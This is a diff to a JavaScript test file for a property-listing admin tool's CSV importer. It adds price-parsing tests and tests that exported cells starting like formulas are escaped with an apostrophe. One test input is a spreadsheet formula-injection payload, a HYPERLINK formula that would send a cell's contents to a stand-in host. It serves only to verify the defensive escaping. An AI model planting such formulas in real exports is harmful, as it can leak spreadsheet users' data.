@@ -3,7 +3,8 @@
 // y que las fotos descargadas de Google Drive (.zip con carpetas) caigan en su casa.
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
-import { decodificarCsv, parseCsv, filasComoObjetos, filaAPropiedad, agruparFotos } from '../admin/js/importar.js';
+import { decodificarCsv, parseCsv, filasComoObjetos, filaAPropiedad, agruparFotos, parseNumero } from '../admin/js/importar.js';
+import { textoCsv } from '../admin/js/formato.js';
 import { OPERACIONES, ESTADOS_PROPIEDAD } from '../admin/js/estados.js';
 
 let ok = 0;
@@ -59,6 +60,32 @@ t('Un CSV de antes con una sola columna «ical» sigue siendo el de Airbnb; un e
 	assert.equal(r.socio.icalUrl, 'https://a.ics');
 	assert.equal(r.socio.icalVrbo, undefined);
 	assert.match(r.errores.join(' '), /VRBO \(ical_vrbo\)/);
+});
+
+t('Precios con el punto pegado a la moneda: «Q.5,000» es 5,000, no 5', () => {
+	assert.equal(parseNumero('Q.5,000'), 5000);
+	assert.equal(parseNumero('Q.350,000'), 350000);
+	assert.equal(parseNumero('Q.2500'), 2500);
+	assert.equal(parseNumero('Q. 1,250,000'), 1250000);
+	assert.equal(parseNumero('US$.300'), 300);
+	// Lo de siempre sigue igual.
+	assert.equal(parseNumero('.5'), 0.5);
+	assert.equal(parseNumero('Q 1,250,000'), 1250000);
+	assert.equal(parseNumero('$350,000.50'), 350000.5);
+	assert.equal(parseNumero('1.250,5'), 1250.5);
+	assert.equal(parseNumero(''), null);
+	assert.ok(Number.isNaN(parseNumero('mucho')));
+});
+
+t('CSV exportado: lo que empieza como fórmula va como texto (apóstrofo), y el importador lo lee como estaba', () => {
+	const csv = textoCsv([['=HYPERLINK("https://x/?d="&B2,"Ver")', '+502 5555 0001', -5, '@hola'], ['\tx', '\rx', 0, 'normal "con comillas"']]);
+	assert.equal(csv.split('\r\n')[0], `"'=HYPERLINK(""https://x/?d=""&B2,""Ver"")","'+502 5555 0001","-5","'@hola"`);
+	assert.equal(csv.split('\r\n')[1], `"'\tx","'\rx","0","normal ""con comillas"""`);
+	// Ida y vuelta: la plantilla y la exportación de propiedades se vuelven a importar sin el apóstrofo.
+	const { filas } = filasComoObjetos(parseCsv('titulo,propietario,descripcion\r\n' + textoCsv([['Casa', '+502 5555 0001', '-sin vista']])));
+	assert.equal(filas[0].propietario, '+502 5555 0001');
+	assert.equal(filas[0].descripcion, '-sin vista');
+	assert.equal(filaAPropiedad({ ...filas[0], operacion: 'vacacional' }, { opciones, duenos }).datos.propietarioId, 'socio-1');
 });
 
 console.log(`${ok} pruebas del importador pasan.`);
